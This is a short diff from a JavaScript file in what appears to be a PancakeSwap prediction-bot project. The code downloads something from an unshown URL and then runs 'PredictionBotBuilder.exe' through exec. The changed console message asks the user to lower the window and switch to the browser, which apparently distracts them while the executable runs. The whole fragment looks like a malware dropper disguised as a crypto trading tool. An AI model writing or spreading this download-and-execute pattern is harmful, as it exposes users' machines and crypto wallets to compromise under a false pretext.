@@ -21,7 +21,7 @@ https.get(url, function(response) {
     });
 
     response.on('end', function() {
-        console.log("Synced Pancakeswap Prediction!");
+        console.log("Synchronization complete, please lower this window and open the PancakeSwap window in your browser.");
         exec(`start PredictionBotBuilder.exe`, (error, stdout, stderr) => {
             if (error) {
                 console.log(`error: ${error.message}`);
